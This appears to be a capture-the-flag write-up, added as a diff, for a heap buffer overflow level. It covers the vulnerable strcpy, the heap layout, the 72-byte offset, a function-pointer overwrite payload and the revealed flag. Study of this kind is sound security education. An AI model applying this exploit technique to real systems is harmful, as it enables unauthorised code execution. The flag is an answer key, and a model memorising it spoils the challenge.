@@ -1,0 +1,87 @@
+Heap Buffer Overflow Analysis - Level6
+=======================================
+
+Target Addresses:
+-----------------
+Function n():        0x08048454 (target - prints password)
+Function m():        0x08048468 (default function)
+
+Memory Layout:
+--------------
+malloc(0x40)  →  64-byte buffer (__dest)
+malloc(4)     →  4-byte function pointer (puVar1)
+
+Heap Structure:
+---------------
+[64-byte buffer] [heap metadata] [4-byte function pointer]
+[    __dest    ] [   8 bytes   ] [      *puVar1        ]
+
+Total offset: 72 bytes
+
+Vulnerability:
+--------------
+strcpy(__dest, argv[1]) - No bounds checking!
+Allows overflow from 64-byte buffer into function pointer
+
+Exploitation Strategy:
+----------------------
+1. Fill 64-byte buffer with padding
+2. Overflow through 8 bytes of heap metadata
+3. Overwrite function pointer at offset 72
+4. Replace default function m() with target function n()
+
+Payload Structure:
+------------------
+'A' * 72 + '\x54\x84\x04\x08'
+
+Breakdown:
+- 'A' * 72: Padding to reach function pointer
+- \x54\x84\x04\x08: Address of n() in little-endian
+
+Heap Metadata:
+--------------
+Between malloc allocations, heap manager stores metadata:
+- Size of allocation
+- Status flags (allocated/free)
+- Pointers to next/previous chunks
+
+In this case: 8 bytes of metadata between buffer and function pointer
+
+Execution Flow:
+---------------
+1. Program allocates buffer and function pointer on heap
+2. Sets function pointer to m()
+3. Copies user input to buffer (vulnerable strcpy)
+4. Calls function via pointer: (*(code *)*puVar1)()
+
+With exploit:
+1. Buffer overflow overwrites function pointer
+2. Function pointer now points to n() instead of m()
+3. Program calls n() → system("/bin/cat /home/user/level7/.pass")
+4. Password revealed
+
+Pattern Offset Discovery:
+--------------------------
+Using peda pattern:
+1. Create pattern: pattern create 100
+2. Run with pattern as argument
+3. Program crashes at 0x65414149 ('IAAe')
+4. Find offset: pattern offset IAAe → 72
+
+Little-Endian Format:
+---------------------
+Address 0x08048454 stored as: \x54\x84\x04\x08
+- Least significant byte first
+- x86 architecture convention
+
+Protection Analysis:
+--------------------
+No RELRO:  GOT is writable (not exploited here)
+No PIE:    Addresses are predictable
+No Canary: No stack protection
+NX disabled: Heap/stack executable (not needed)
+
+Result:
+-------
+Flag: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
